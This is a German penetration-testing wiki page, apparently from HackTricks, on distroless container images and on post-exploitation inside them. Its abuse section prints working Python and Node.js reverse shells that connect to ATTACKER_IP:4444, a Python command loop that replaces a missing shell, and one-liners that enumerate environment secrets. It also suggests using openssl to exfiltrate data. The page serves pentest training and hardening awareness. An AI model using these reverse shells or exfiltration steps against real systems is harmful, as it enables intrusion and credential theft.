# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Ein **distroless** Container-Image ist ein Image, das die **minimal erforderlichen Laufzeitkomponenten zum Ausführen einer bestimmten Anwendung** enthält und dabei bewusst die üblichen Distributionstools wie Paketmanager, Shells und große Mengen generischer Userland-Werkzeuge entfernt. In der Praxis enthalten distroless Images oft nur das Anwendungs-Binary oder die Laufzeitumgebung, die zugehörigen Shared Libraries, Zertifikats-Bundles und ein sehr kleines Dateisystem-Layout.

Der Punkt ist nicht, dass distroless ein neues Kernel-Isolations-Primitive wäre. Distroless ist eine **Strategie für das Image-Design**. Sie verändert, was **innerhalb** des Container-Dateisystems verfügbar ist, nicht die Art und Weise, wie der Kernel den Container isoliert. Dieser Unterschied ist wichtig, weil distroless die Umgebung hauptsächlich dadurch härtet, dass die Möglichkeiten reduziert werden, die ein Angreifer nach dem Erlangen von Codeausführung nutzen kann. Es ersetzt keine Namespaces, seccomp, Capabilities, AppArmor, SELinux oder andere Mechanismen zur Laufzeit-Isolation.

## Warum Distroless existiert

Distroless Images werden hauptsächlich verwendet, um Folgendes zu reduzieren:

- die Image-Größe
- die operationale Komplexität des Images
- die Anzahl der Pakete und Binaries, die Schwachstellen enthalten könnten
- die Anzahl der standardmäßig verfügbaren Post-Exploitation-Tools für einen Angreifer

Deshalb sind distroless Images bei Produktions-Deployments von Anwendungen beliebt. Ein Container, der keine Shell, keinen Paketmanager und fast keine generischen Tools enthält, ist normalerweise leichter operational zu beurteilen und nach einer Kompromittierung schwieriger interaktiv zu missbrauchen.

Beispiele für bekannte distroless-ähnliche Image-Familien sind:

- Googles distroless Images
- Chainguard hardened/minimal Images

## Was Distroless nicht bedeutet

Ein distroless Container ist **nicht**:

- automatisch rootless
- automatisch nicht privilegiert
- automatisch schreibgeschützt
- automatisch durch seccomp, AppArmor oder SELinux geschützt
- automatisch vor einem Container Escape geschützt

Es ist weiterhin möglich, ein distroless Image mit `--privileged`, gemeinsam genutzten Host-Namespaces, gefährlichen Bind-Mounts oder einem gemounteten Runtime-Socket auszuführen. In diesem Szenario mag das Image minimal sein, der Container kann jedoch weiterhin katastrophal unsicher sein. Distroless verändert die **Userland-Angriffsfläche**, nicht die **Kernel-Vertrauensgrenze**.

## Typische operationale Eigenschaften

Wenn du einen distroless Container kompromittierst, stellst du normalerweise als Erstes fest, dass gängige Annahmen nicht mehr zutreffen. Es gibt möglicherweise kein `sh`, kein `bash`, kein `ls`, kein `id`, kein `cat` und manchmal nicht einmal eine libc-basierte Umgebung, die sich so verhält, wie es dein übliches Tradecraft erwartet. Das beeinflusst sowohl Offensive als auch Defensive, da der Mangel an Tools Debugging, Incident Response und Post-Exploitation verändert.

Die häufigsten Muster sind:

- die Anwendungs-Laufzeitumgebung ist vorhanden, aber kaum etwas anderes
- Shell-basierte Payloads schlagen fehl, weil keine Shell vorhanden ist
- übliche Enumeration-One-Liner schlagen fehl, weil die Hilfs-Binaries fehlen
- Dateisystem-Schutzmechanismen wie ein read-only rootfs oder `noexec` auf beschreibbaren tmpfs-Speicherorten sind oft ebenfalls vorhanden

Diese Kombination führt normalerweise dazu, dass von „weaponizing distroless“ gesprochen wird.

## Distroless und Post-Exploitation

Die größte offensive Herausforderung in einer distroless Umgebung ist nicht immer die initiale RCE. Oft geht es darum, was danach kommt. Wenn der kompromittierte Workload Codeausführung in einer Language Runtime wie Python, Node.js, Java oder Go ermöglicht, kannst du möglicherweise beliebige Logik ausführen, jedoch nicht über die normalen shell-zentrierten Workflows, die bei anderen Linux-Zielen üblich sind.

Das bedeutet, dass sich die Post-Exploitation oft in eine von drei Richtungen entwickelt:

1. **Die bereits vorhandene Language Runtime direkt verwenden**, um die Umgebung zu enumerieren, Sockets zu öffnen, Dateien zu lesen oder zusätzliche Payloads zu übertragen.
2. **Eigene Tools in den Speicher laden**, wenn das Dateisystem schreibgeschützt ist oder beschreibbare Speicherorte mit `noexec` gemountet sind.
3. **Bereits im Image vorhandene Binaries missbrauchen**, wenn die Anwendung oder ihre Abhängigkeiten unerwartet etwas Nützliches enthalten.

## Missbrauch

### Die bereits vorhandene Runtime enumerieren

In vielen distroless Containern gibt es keine Shell, aber weiterhin eine Anwendungs-Runtime. Wenn das Ziel ein Python-Service ist, ist Python vorhanden. Wenn das Ziel Node.js verwendet, ist Node vorhanden. Das bietet häufig ausreichend Funktionalität, um Dateien zu enumerieren, Umgebungsvariablen zu lesen, Reverse Shells zu öffnen und In-Memory-Ausführung vorzubereiten, ohne jemals `/bin/sh` aufzurufen.

Ein einfaches Beispiel mit Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ein einfaches Beispiel mit Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Auswirkungen:

- Auslesen von Umgebungsvariablen, die häufig Credentials oder Service-Endpunkte enthalten
- Dateisystemaufzählung ohne `/bin/ls`
- Identifizierung beschreibbarer Pfade und gemounteter Secrets

### Reverse Shell Ohne `/bin/sh`

Wenn das Image weder `sh` noch `bash` enthält, kann eine klassische, Shell-basierte Reverse Shell sofort fehlschlagen. Verwende in diesem Fall stattdessen die installierte Language Runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Falls `/bin/sh` nicht existiert, ersetze die letzte Zeile durch eine direkte Python-gesteuerte Befehlsausführung oder eine Python-REPL-Schleife.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Erneut gilt: Wenn `/bin/sh` nicht vorhanden ist, verwenden Sie direkt die Datei-, Prozess- und Netzwerk-APIs von Node, anstatt eine Shell zu starten.

### Vollständiges Beispiel: No-Shell Python Command Loop

Wenn das Image zwar Python, aber überhaupt keine Shell enthält, reicht eine einfache interaktive Schleife oft aus, um die vollständige post-exploitation-Fähigkeit aufrechtzuerhalten:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dies erfordert keine interaktive Shell-Binary. Die Auswirkungen sind aus Sicht des Angreifers praktisch dieselben wie bei einer einfachen Shell: Befehlsausführung, Enumeration und das Staging weiterer Payloads über die vorhandene Runtime.

### Tool-Ausführung im Speicher

Distroless-Images werden häufig kombiniert mit:

- `readOnlyRootFilesystem: true`
- beschreibbarem, aber `noexec`-geschütztem tmpfs wie `/dev/shm`
- fehlenden Paketverwaltungstools

Diese Kombination macht klassische Workflows nach dem Muster „Binary auf die Festplatte herunterladen und ausführen“ unzuverlässig. In diesen Fällen werden Techniken zur Speicherausführung zur wichtigsten Lösung.

Die entsprechende Seite ist:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die relevantesten Techniken dort sind:

- `memfd_create` + `execve` über Scripting-Runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Bereits im Image vorhandene Binaries

Einige Distroless-Images enthalten weiterhin für den Betrieb notwendige Binaries, die nach einer Kompromittierung nützlich werden. Ein häufig beobachtetes Beispiel ist `openssl`, da Anwendungen es manchmal für kryptografische oder TLS-bezogene Aufgaben benötigen.

Ein schnelles Suchmuster ist:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Wenn `openssl` vorhanden ist, kann es möglicherweise verwendet werden für:

- ausgehende TLS-Verbindungen
- Datenexfiltration über einen zulässigen Egress-Kanal
- das Staging von Payload-Daten durch codierte/verschlüsselte Blobs

Der genaue Missbrauch hängt davon ab, was tatsächlich installiert ist. Die allgemeine Idee besteht jedoch darin, dass distroless nicht „überhaupt keine Tools“ bedeutet, sondern „weitaus weniger Tools als ein normales Distributions-Image“.

## Prüfungen

Das Ziel dieser Prüfungen besteht darin festzustellen, ob das Image in der Praxis wirklich distroless ist und welche Runtime- oder Hilfs-Binaries noch für post-exploitation verfügbar sind.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Was ist hier interessant:

- Wenn keine Shell vorhanden ist, aber eine Runtime wie Python oder Node verfügbar ist, sollte die post-exploitation auf runtime-gesteuerte Ausführung umschwenken.
- Wenn das Root-Dateisystem read-only und `/dev/shm` beschreibbar, aber mit `noexec` eingebunden ist, werden Memory-Execution-Techniken deutlich relevanter.
- Wenn Hilfs-Binaries wie `openssl`, `busybox` oder `java` vorhanden sind, können sie genügend Funktionalität bieten, um weiteren Zugriff vorzubereiten.

## Runtime-Standardeinstellungen

| Image- / Plattformstil | Standardzustand | Typisches Verhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Google distroless style images | Minimaler Userland by design | Keine Shell, kein package manager, nur Anwendungs-/Runtime-Abhängigkeiten | Hinzufügen von Debugging-Layern, sidecar shells, Kopieren von busybox oder Tooling |
| Chainguard minimal images | Minimaler Userland by design | Reduzierte Package-Oberfläche, oft auf eine Runtime oder einen Service fokussiert | Verwendung von `:latest-dev` oder Debug-Varianten, Kopieren von Tools während des Builds |
| Kubernetes workloads using distroless images | Hängt von der Pod-Konfiguration ab | Distroless betrifft nur den Userland; die Sicherheitslage des Pods hängt weiterhin von der Pod-Spezifikation und den Runtime-Standardeinstellungen ab | Hinzufügen von ephemeral debug containers, Host-Mounts, privilegierten Pod-Einstellungen |
| Docker / Podman running distroless images | Hängt von den Run-Flags ab | Minimales Dateisystem, aber die Runtime-Sicherheit hängt weiterhin von Flags und der Daemon-Konfiguration ab | `--privileged`, gemeinsame Host-Namespaces, Runtime-Socket-Mounts, beschreibbare Host-Bind-Mounts |

Der entscheidende Punkt ist, dass distroless eine **Image-Eigenschaft** und kein Runtime-Schutz ist. Der Nutzen entsteht durch die Reduzierung dessen, was nach einem compromise innerhalb des Dateisystems verfügbar ist.

## Verwandte Seiten

Für Umgehungen von Dateiystem- und Memory-Execution-Schutzmechanismen, die in distroless-Umgebungen häufig benötigt werden:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Für den Missbrauch von Container-Runtime, Sockets und Mounts, der weiterhin auf distroless workloads anwendbar ist:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
